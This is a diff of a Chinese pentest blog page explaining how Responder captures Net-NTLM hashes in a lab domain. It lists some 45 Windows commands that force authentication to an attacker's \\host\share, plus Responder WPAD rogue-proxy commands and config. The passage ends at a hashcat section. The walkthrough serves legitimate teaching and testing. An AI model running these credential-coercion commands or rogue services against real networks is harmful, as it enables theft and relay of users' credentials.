@@ -1,383 +1,182 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="在内网中利用 Responder 这个工具获取 Net-NTLM hash"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>内网渗透之 Responder 与 Net-NTLM hash | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>内网渗透之 Responder 与 Net-NTLM hash</h1>
-      
-<div class="post-meta">
-    <time>2018-09-10</time>
-    (update <time>2022-10-12</time>)
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/intranet">intranet</a>)
-</div>
-
-      <div><h3 id="0x00-一些概念">0x00 一些概念</h3>
-<ul>
-<li>
-<p>Windows 认证协议</p>
-<p>分为：基于 NTLM 的认证和基于 kerberos 的认证</p>
-</li>
-<li>
-<p>什么是 NTLM Hash？</p>
-<p>早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash</p>
-</li>
-<li>
-<p>什么是 Challenge-Response 挑战/响应验证机制？</p>
-<ul>
-<li>Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC</li>
-<li>DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client</li>
-<li>Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server</li>
-<li>Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证</li>
-</ul>
-</li>
-<li>
-<p>NTLM Hash 与 Net-NTLM Hash</p>
-<ul>
-<li>NTLM Hash 通常是指 Windows 系统下 SAM 中保存的用户密码 hash，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中获得所有用户的 hash（比如用 Mimikatz 提取），“挑战/响应验证”中的用户名及密码 hash 就是 NTLM Hash，可以用来进行 PtH、PtT 攻击</li>
-<li>Net-NTLM Hash 通常是指网络环境下 NTLM 认证中的 hash，是基于用户密码的 NTLM Hash 计算出来的，“挑战/响应验证”中的 response 中包含 Net-NTLM hash，而用 Responder 抓取的就是 Net-NTLM Hash，可以用来做中继攻击</li>
-</ul>
-</li>
-<li>
-<p>关于 Responder<br>
-由 Laurent Gaffie 撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括 Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如 SQL 服务器，FTP，HTTP 和 SMB 服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder 也有能力攻击 LLMNR，NBT-NS 和 mDNS 等协议。</p>
-</li>
-<li>
-<p>什么是 NTLM 中继攻击？<br>
-Net-NTLM 中继攻击思路是让受害者把 Net-NTLM hash 发送给攻击者，然后攻击着拿着 Hash 访问远程服务<br>
-对于 SMB、HTTP、LDAP、MSSQL 等用 NTLM 进行认证的程序，都可以尝试用来向攻击者发送 Net-NTLM hash<br>
-比如 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，<br>
-所以我们让目标访问 <code>\\your-vps-ip\aaa</code> 的话，他就会把 hash 发送到我们的 vps</p>
-</li>
-</ul>
-<h3 id="0x01-软件环境">0x01 软件环境</h3>
-<ul>
-<li>可以从<a href="https://github.com/lgandx/Responder?_blank">https://github.com/lgandx/Responder</a>下载Responder</li>
-<li>被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段</li>
-<li>域控主机：Win2008（10.11.11.5）用户 Administrator</li>
-<li>域内主机：Win7（10.11.11.7）登录用户 zhangsan</li>
-</ul>
-<h3 id="0x02-通过-smb-服务获取-net-ntlm-hash">0x02 通过 SMB 服务获取 Net-NTLM hash</h3>
-<p>对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，所以可以模拟 SMB 服务器从而截获 hash，执行如下命令都可以得到 hash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net.exe use <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>attrib.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>bcdboot.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>bdeunlock.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>cacls.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>certreq.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops an error dialog)</span>
-</span></span><span style="display:flex;"><span>certutil.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>cipher.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>ClipUp.exe -l <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>cmdl32.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>cmstp.exe /s <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>colorcpl.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops an error dialog)</span>
-</span></span><span style="display:flex;"><span>comp.exe /N<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>compact.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>control.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>convertvhd.exe -source <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare -destination <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>Defrag.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>DeployUtil.exe /install <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>DevToolsLauncher.exe GetFileListing <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(this one&#39;s cool. will return a file listing (json-formatted) from remote SMB share...)</span>
-</span></span><span style="display:flex;"><span>diskperf.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>dispdiag.exe -out <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>doskey.exe /MACROFILE<span style="color:#f92672">=</span><span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>esentutl.exe /k <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>expand.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>extrac32.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>FileHistory.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops a gui)</span>
-</span></span><span style="display:flex;"><span>findstr.exe * <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>fontview.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops an error dialog)</span>
-</span></span><span style="display:flex;"><span>fvenotify.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops an access denied error)</span>
-</span></span><span style="display:flex;"><span>FXSCOVER.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops GUI)</span>
-</span></span><span style="display:flex;"><span>hwrcomp.exe -check <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>hwrreg.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>icacls.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>LaunchWinApp.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, will pop an explorer window with the  contents of your SMB share.)</span>
-</span></span><span style="display:flex;"><span>licensingdiag.exe -cab <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>lodctr.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>lpksetup.exe /p <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare /s
-</span></span><span style="display:flex;"><span>makecab.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare
-</span></span><span style="display:flex;"><span>MdmDiagnosticsTool.exe -out <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span>
-</span></span><span style="display:flex;"><span>mshta.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops an HTA window)</span>
-</span></span><span style="display:flex;"><span>msiexec.exe /update <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare /quiet
-</span></span><span style="display:flex;"><span>msinfo32.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, pops a &#34;cannot open&#34; dialog)</span>
-</span></span><span style="display:flex;"><span>mspaint.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, invalid path to png error)</span>
-</span></span><span style="display:flex;"><span>mspaint.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare<span style="color:#ae81ff">\s</span>hare.png <span style="color:#75715e">#(will capture hash, and display the remote PNG file to the user)</span>
-</span></span><span style="display:flex;"><span>msra.exe /openfile <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, error)</span>
-</span></span><span style="display:flex;"><span>mstsc.exe <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare <span style="color:#75715e">#(noisy, error)</span>
-</span></span><span style="display:flex;"><span>netcfg.exe -l <span style="color:#ae81ff">\\</span>host<span style="color:#ae81ff">\s</span>hare -c p -i foo
-</span></span></code></pre></div><ul>
-<li>攻击机配置开启 SMB 后执行：$ sudo python Responder.py -I eth0 -v
-<img src="/img/post/Xnip2020-12-11_11-02-33.png" alt="90"></li>
-</ul>
-<h3 id="0x03-通过-web-漏洞获取-net-ntlm-hash">0x03 通过 web 漏洞获取 Net-NTLM hash</h3>
-<p>前提：同样是开启 SMB 服务，然后执行 sudo python Responder.py -I eth0 -v</p>
-<ul>
-<li>
-<p>通过文件包含获取(获取到的是 Administrator 的 hash)
-<img src="/img/post/Xnip2020-12-11_11-39-10.png" alt="90"></p>
-</li>
-<li>
-<p>通过 XSS 获取(获取到的是 zhangsan 的 hash)(只有 IE 和 edge 能行)
-<img src="/img/post/Xnip2020-12-11_11-46-56.png" alt="80"></p>
-</li>
-</ul>
-<h3 id="0x04-wpad-代理服务器抓取-net-ntlm-hash">0x04 WPAD 代理服务器抓取 Net-NTLM hash</h3>
-<p>WPAD 用于在 windows 中自动化的设置 ie 浏览器的代理，从 Windows 2000 开始该功能被默认开启。</p>
-<p>开启 Responder 的 WPAD 后，当 PC 浏览网站时即可抓取到 NET-NTLM hash。</p>
-<ul>
-<li>参数说明</li>
-</ul>
-<pre tabindex="0"><code>-w, --wpad            Start the WPAD rogue proxy server. Default value is False
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="在内网中利用 Responder 这个工具获取 Net-NTLM hash"><meta name=author content="Reber"><title>内网渗透之 Responder 与 Net-NTLM hash | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>内网渗透之 Responder 与 Net-NTLM hash</h1><div class=post-meta><time>2018-09-10</time>
+(update <time>2022-10-12</time>)
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/intranet>intranet</a>)</div><div><h3 id=0x00-一些概念>0x00 一些概念</h3><ul><li><p>Windows 认证协议</p><p>分为：基于 NTLM 的认证和基于 kerberos 的认证</p></li><li><p>什么是 NTLM Hash？</p><p>早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash</p></li><li><p>什么是 Challenge-Response 挑战/响应验证机制？</p><ul><li>Client 输入 username、password、domain，然后将用户名及密码 hash 后存在本地，并将 username 发送到 DC</li><li>DC 生成一个 16 字节的随机数，即 Challenge(挑战码)，然后传回 Client</li><li>Client 收到 Challenge 后将密码 hash 和 challenge 混合 hash，混合后的 hash 称为 response，然后将 challenge、response 和 username 发送给 Server</li><li>Server 将收到的 3 个值转发给 DC，然后 DC 根据传过来的 username 到域控的账号数据库 ntds.list 找到对应的密码 hash，将 hash 和 Client 传过来的 challenge 混合 hash，将这个混合 hash 与 Client 传过来的 response 进行对比验证</li></ul></li><li><p>NTLM Hash 与 Net-NTLM Hash</p><ul><li>NTLM Hash 通常是指 Windows 系统下 SAM 中保存的用户密码 hash，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件中获得所有用户的 hash（比如用 Mimikatz 提取），“挑战/响应验证”中的用户名及密码 hash 就是 NTLM Hash，可以用来进行 PtH、PtT 攻击</li><li>Net-NTLM Hash 通常是指网络环境下 NTLM 认证中的 hash，是基于用户密码的 NTLM Hash 计算出来的，“挑战/响应验证”中的 response 中包含 Net-NTLM hash，而用 Responder 抓取的就是 Net-NTLM Hash，可以用来做中继攻击</li></ul></li><li><p>关于 Responder<br>由 Laurent Gaffie 撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括 Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如 SQL 服务器，FTP，HTTP 和 SMB 服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder 也有能力攻击 LLMNR，NBT-NS 和 mDNS 等协议。</p></li><li><p>什么是 NTLM 中继攻击？<br>Net-NTLM 中继攻击思路是让受害者把 Net-NTLM hash 发送给攻击者，然后攻击着拿着 Hash 访问远程服务<br>对于 SMB、HTTP、LDAP、MSSQL 等用 NTLM 进行认证的程序，都可以尝试用来向攻击者发送 Net-NTLM hash<br>比如 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，<br>所以我们让目标访问 <code>\\your-vps-ip\aaa</code> 的话，他就会把 hash 发送到我们的 vps</p></li></ul><h3 id=0x01-软件环境>0x01 软件环境</h3><ul><li>可以从<a href=https://github.com/lgandx/Responder?_blank>https://github.com/lgandx/Responder</a>下载Responder</li><li>被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段</li><li>域控主机：Win2008（10.11.11.5）用户 Administrator</li><li>域内主机：Win7（10.11.11.7）登录用户 zhangsan</li></ul><h3 id=0x02-通过-smb-服务获取-net-ntlm-hash>0x02 通过 SMB 服务获取 Net-NTLM hash</h3><p>对于 SMB 协议，客户端在连接服务端时，默认先使用本机的用户名和密码 hash 尝试登录，所以可以模拟 SMB 服务器从而截获 hash，执行如下命令都可以得到 hash</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>net.exe use <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>attrib.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>bcdboot.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>bdeunlock.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>cacls.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>certreq.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops an error dialog)</span>
+</span></span><span style=display:flex><span>certutil.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>cipher.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>ClipUp.exe -l <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>cmdl32.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>cmstp.exe /s <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>colorcpl.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops an error dialog)</span>
+</span></span><span style=display:flex><span>comp.exe /N<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>compact.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>control.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>convertvhd.exe -source <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare -destination <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>Defrag.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>DeployUtil.exe /install <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>DevToolsLauncher.exe GetFileListing <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(this one&#39;s cool. will return a file listing (json-formatted) from remote SMB share...)</span>
+</span></span><span style=display:flex><span>diskperf.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>dispdiag.exe -out <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>doskey.exe /MACROFILE<span style=color:#f92672>=</span><span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>esentutl.exe /k <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>expand.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>extrac32.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>FileHistory.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops a gui)</span>
+</span></span><span style=display:flex><span>findstr.exe * <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>fontview.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops an error dialog)</span>
+</span></span><span style=display:flex><span>fvenotify.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops an access denied error)</span>
+</span></span><span style=display:flex><span>FXSCOVER.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops GUI)</span>
+</span></span><span style=display:flex><span>hwrcomp.exe -check <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>hwrreg.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>icacls.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>LaunchWinApp.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, will pop an explorer window with the  contents of your SMB share.)</span>
+</span></span><span style=display:flex><span>licensingdiag.exe -cab <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>lodctr.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>lpksetup.exe /p <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare /s
+</span></span><span style=display:flex><span>makecab.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare
+</span></span><span style=display:flex><span>MdmDiagnosticsTool.exe -out <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span>
+</span></span><span style=display:flex><span>mshta.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops an HTA window)</span>
+</span></span><span style=display:flex><span>msiexec.exe /update <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare /quiet
+</span></span><span style=display:flex><span>msinfo32.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, pops a &#34;cannot open&#34; dialog)</span>
+</span></span><span style=display:flex><span>mspaint.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, invalid path to png error)</span>
+</span></span><span style=display:flex><span>mspaint.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare<span style=color:#ae81ff>\s</span>hare.png <span style=color:#75715e>#(will capture hash, and display the remote PNG file to the user)</span>
+</span></span><span style=display:flex><span>msra.exe /openfile <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, error)</span>
+</span></span><span style=display:flex><span>mstsc.exe <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare <span style=color:#75715e>#(noisy, error)</span>
+</span></span><span style=display:flex><span>netcfg.exe -l <span style=color:#ae81ff>\\</span>host<span style=color:#ae81ff>\s</span>hare -c p -i foo
+</span></span></code></pre></div><ul><li>攻击机配置开启 SMB 后执行：$ sudo python Responder.py -I eth0 -v
+<img src=/img/post/Xnip2020-12-11_11-02-33.png alt=90></li></ul><h3 id=0x03-通过-web-漏洞获取-net-ntlm-hash>0x03 通过 web 漏洞获取 Net-NTLM hash</h3><p>前提：同样是开启 SMB 服务，然后执行 sudo python Responder.py -I eth0 -v</p><ul><li><p>通过文件包含获取(获取到的是 Administrator 的 hash)
+<img src=/img/post/Xnip2020-12-11_11-39-10.png alt=90></p></li><li><p>通过 XSS 获取(获取到的是 zhangsan 的 hash)(只有 IE 和 edge 能行)
+<img src=/img/post/Xnip2020-12-11_11-46-56.png alt=80></p></li></ul><h3 id=0x04-wpad-代理服务器抓取-net-ntlm-hash>0x04 WPAD 代理服务器抓取 Net-NTLM hash</h3><p>WPAD 用于在 windows 中自动化的设置 ie 浏览器的代理，从 Windows 2000 开始该功能被默认开启。</p><p>开启 Responder 的 WPAD 后，当 PC 浏览网站时即可抓取到 NET-NTLM hash。</p><ul><li>参数说明</li></ul><pre tabindex=0><code>-w, --wpad            Start the WPAD rogue proxy server. Default value is False
 -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                         retrieval. This may cause a login prompt. Default: False
 
 加 -w on 参数即可开启 WPAD 抓取 hash
-</code></pre><ul>
-<li>配置(开启 http 和 https)</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  Responder git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗ head -n <span style="color:#ae81ff">16</span> Responder.conf
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Responder Core<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>; Servers to start
-</span></span><span style="display:flex;"><span>SQL <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>SMB <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>RDP <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>Kerberos <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>FTP <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>POP <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>SMTP <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>IMAP <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>HTTP <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>HTTPS <span style="color:#f92672">=</span> On
-</span></span><span style="display:flex;"><span>DNS <span style="color:#f92672">=</span> Off
-</span></span><span style="display:flex;"><span>LDAP <span style="color:#f92672">=</span> Off
-</span></span></code></pre></div><ul>
-<li>攻击机执行：$ sudo python Responder.py -I eth0 -v -w on -F on
-<img src="/img/post/Xnip2020-12-11_14-28-15.png" alt="90"></li>
-</ul>
-<h3 id="0x05-使用hashcat解密">0x05 使用hashcat解密</h3>
-<ul>
-<li>安装hashcat(参考<a href="https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going?_blank">这里</a>)</li>
-</ul>
